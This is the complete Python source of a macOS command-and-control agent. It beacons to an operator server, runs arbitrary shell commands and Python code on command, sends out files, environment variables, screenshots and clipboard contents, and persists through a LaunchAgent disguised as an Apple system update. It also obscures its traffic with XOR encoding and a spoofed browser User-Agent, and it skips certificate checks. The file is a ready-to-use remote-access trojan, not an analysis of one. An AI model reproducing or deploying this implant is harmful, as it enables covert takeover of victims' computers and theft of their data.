#!/usr/bin/env python3
"""C2 Agent — macOS (Python 3, stdlib only)."""

import os, sys, json, time, socket, platform, subprocess, uuid, threading, base64, ssl
from urllib.request import Request, urlopen, HTTPSHandler, build_opener
from base64 import b64encode, b64decode

C2_URL     = os.environ.get("C2_URL",     "http://CHANGE_ME:443")
AGENT_ID   = os.environ.get("AGENT_ID",   str(uuid.uuid4()))
SLEEP      = int(os.environ.get("SLEEP",   "5"))
JITTER     = int(os.environ.get("JITTER",  "10"))
ENC_KEY    = os.environ.get("ENC_KEY",    "")
AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")

def xor_crypt(data: bytes, key: bytes) -> bytes:
    kl = len(key)
    return bytes(b ^ key[i % kl] for i, b in enumerate(data))

def get_internal_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def http_post(path, data):
    payload_str = json.dumps(data)
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    if AUTH_TOKEN:
        headers["X-Auth-Token"] = AUTH_TOKEN
    if ENC_KEY:
        body = b64encode(xor_crypt(payload_str.encode(), ENC_KEY.encode())).decode()
        headers["X-Enc"] = "1"
        headers["Content-Type"] = "text/plain"
    else:
        body = payload_str

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = build_opener(HTTPSHandler(context=ctx))
    req = Request(f"{C2_URL}{path}", data=body.encode(), headers=headers)
    resp = opener.open(req, timeout=15)
    raw = resp.read()
    if ENC_KEY and resp.headers.get("Content-Type", "").startswith("text/plain"):
        try:
            return json.loads(xor_crypt(b64decode(raw), ENC_KEY.encode()).decode())
        except Exception:
            pass
    return json.loads(raw)

def collect_sysinfo():
    return {
        "cpu_count": os.cpu_count(),
        "hostname": socket.gethostname(),
        "platform": platform.platform(),
        "macos_version": platform.mac_ver()[0],
        "python": platform.python_version(),
        "arch": platform.machine(),
        "cwd": os.getcwd(),
    }

def register():
    info = {
        "id": AGENT_ID,
        "hostname": socket.gethostname(),
        "username": subprocess.check_output("whoami", shell=True, timeout=5).decode().strip(),
        "os": f"macOS {platform.mac_ver()[0]}",
        "arch": platform.machine(),
        "ip_internal": get_internal_ip(),
        "platform_type": "macos",
    }
    return http_post("/api/agent/register", info)

def execute_task(task):
    tt = task.get("task_type", "cmd")
    payload = task.get("payload", "")
    result = ""
    try:
        if tt == "cmd":
            result = subprocess.check_output(payload, shell=True, stderr=subprocess.STDOUT, timeout=300).decode(errors="replace")

        elif tt == "python":
            import io
            buf = io.StringIO()
            old = sys.stdout; sys.stdout = buf
            try:
                exec(compile(payload, "<c2>", "exec"), {"__builtins__": __builtins__})
                result = buf.getvalue() or "executed (no output)"
            finally:
                sys.stdout = old

        elif tt == "sysinfo":
            result = json.dumps(collect_sysinfo(), indent=2)

        elif tt == "env":
            result = "\n".join(f"{k}={v}" for k, v in sorted(os.environ.items()))

        elif tt == "ls":
            target = payload.strip() or "."
            result = "\n".join(
                ("d " if os.path.isdir(os.path.join(target, x)) else "- ") + x
                for x in sorted(os.listdir(target))
            )

        elif tt == "ps":
            result = subprocess.check_output("ps aux", shell=True, timeout=10).decode(errors="replace")

        elif tt == "net":
            result = subprocess.check_output("ifconfig && netstat -rn", shell=True, timeout=10).decode(errors="replace")

        elif tt == "download":
            if os.path.exists(payload):
                with open(payload, "rb") as f:
                    result = f"[b64:{payload}] " + b64encode(f.read()).decode()
            else:
                result = f"File not found: {payload}"

        elif tt == "upload":
            parts = payload.split("|", 1)
            if len(parts) == 2:
                path, b64data = parts
                os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
                with open(path, "wb") as f:
                    f.write(base64.b64decode(b64data))
                result = f"Written to {path}"

        elif tt == "screenshot":
            subprocess.run(["screencapture", "-x", "/tmp/.c2screen.png"], timeout=10)
            with open("/tmp/.c2screen.png", "rb") as f:
                result = "[b64:/tmp/.c2screen.png] " + b64encode(f.read()).decode()

        elif tt == "clipboard":
            result = subprocess.check_output("pbpaste", shell=True, timeout=5).decode(errors="replace")

        elif tt == "persist":
            script = os.path.abspath(__file__)
            plist = os.path.expanduser("~/Library/LaunchAgents/com.apple.system.update.plist")
            content = f"""<?xml version="1.0"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.system.update</string>
<key>ProgramArguments</key><array><string>python3</string><string>{script}</string></array>
<key>RunAtLoad</key><true/><key>KeepAlive</key><true/>
</dict></plist>"""
            os.makedirs(os.path.dirname(plist), exist_ok=True)
            open(plist, "w").write(content)
            os.system(f"launchctl load {plist} 2>/dev/null")
            result = f"LaunchAgent installed: {plist}"

        elif tt == "kill":
            os.system("launchctl remove com.apple.system.update 2>/dev/null")
            result = "Agent terminating"
            try:
                http_post("/api/agent/result", {"task_id": task["id"], "result": result})
            except Exception:
                pass
            sys.exit(0)

        else:
            result = f"Unknown task type: {tt}"

    except subprocess.TimeoutExpired:
        result = "[timeout exceeded]"
    except Exception as e:
        result = f"[error] {type(e).__name__}: {e}"

    return result[:65000] + ("\n[...truncated]" if len(result) > 65000 else "")

def beacon_loop():
    import random
    _sleep = SLEEP
    _jitter = JITTER
    while True:
        try:
            resp = http_post("/api/agent/beacon", {"id": AGENT_ID})
            _sleep = int(resp.get("sleep", _sleep))
            _jitter = int(resp.get("jitter", _jitter))
            for task in resp.get("tasks", []):
                try:
                    result = execute_task(task)
                    http_post("/api/agent/result", {"task_id": task["id"], "result": result})
                except Exception as e:
                    try:
                        http_post("/api/agent/result", {"task_id": task["id"], "result": f"[agent error] {e}"})
                    except Exception:
                        pass
        except Exception:
            pass
        jitter_s = _sleep * _jitter / 100
        time.sleep(max(1, _sleep + random.uniform(-jitter_s, jitter_s)))

if __name__ == "__main__":
    while True:
        try:
            register()
            break
        except Exception:
            time.sleep(10)
    beacon_loop()
